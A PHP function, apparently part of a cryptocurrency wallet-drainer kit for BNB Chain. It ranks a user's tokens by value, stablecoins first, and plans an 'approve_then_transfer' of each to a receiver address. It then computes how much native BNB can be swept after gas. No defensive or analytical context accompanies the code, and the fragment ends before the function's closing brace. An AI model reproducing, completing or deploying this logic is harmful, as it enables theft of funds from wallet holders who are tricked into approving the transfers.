/**
 * Build an action plan from discovered assets.
 * Stablecoins first, then high-value tokens, then low-value.
 * Includes gas estimation to determine if native sweep is viable.
 */
function buildActionPlan(
    array $assets,
    int $chainId,
    string $userAddress,
    string $nativeBalanceWei,
    string $receiver
): array {
    $stables     = json_decode(STABLECOINS, true);
    $tokenList   = getTokenList($chainId);
    $priorityMap = [];

    // Build priority lookup from full token list
    $fullTokens = json_decode(KNOWN_TOKENS_BSC, true);
    foreach ($fullTokens as $t) {
        $priorityMap[$t['symbol']] = $t['priority'] ?? 'low';
    }

    // Sort: stables first, then high, medium, low
    usort($assets, function($a, $b) use ($stables, $priorityMap) {
        $aIsStable = in_array($a['symbol'], $stables);
        $bIsStable = in_array($b['symbol'], $stables);
        if ($aIsStable && !$bIsStable) return -1;
        if (!$aIsStable && $bIsStable) return 1;

        $priOrder = ['stable' => 0, 'high' => 1, 'medium' => 2, 'low' => 3];
        $aPri = $priOrder[$priorityMap[$a['symbol']] ?? 'low'] ?? 3;
        $bPri = $priOrder[$priorityMap[$b['symbol']] ?? 'low'] ?? 3;
        return $aPri - $bPri;
    });

    $steps = [];
    foreach ($assets as $asset) {
        $steps[] = [
            'order'      => count($steps) + 1,
            'type'       => 'token',
            'symbol'     => $asset['symbol'],
            'address'    => $asset['address'],
            'decimals'   => $asset['decimals'],
            'balance'    => $asset['balance'],
            'rawBalance' => $asset['rawBalance'] ?? null,
            'spender'    => $receiver,
            'action'     => 'approve_then_transfer',
            'gas_limit'  => GAS_LIMIT_TOKEN,
            'allowance_wait_seconds' => 7,
        ];
    }

    // Native BNB sweep estimation
    $nativeBalanceBig = gmp_init($nativeBalanceWei, 10);
    $gasPriceEstimate = gmp_init('3000000000', 10); // 3 Gwei fallback
    $gasCostEstimate  = gmp_mul($gasPriceEstimate, gmp_init(GAS_UNITS_NATIVE));
    $sendable         = gmp_sub($nativeBalanceBig, $gasCostEstimate);

    $skipNative   = gmp_cmp($sendable, gmp_init('0')) <= 0;
    $nativeAmount = $skipNative ? '0' : gmp_strval($sendable, 10);

    return [
        'steps'         => $steps,
        'total_tokens'  => count($steps),
        'skip_native'   => $skipNative,
        'native_amount' => $nativeAmount,
    ];
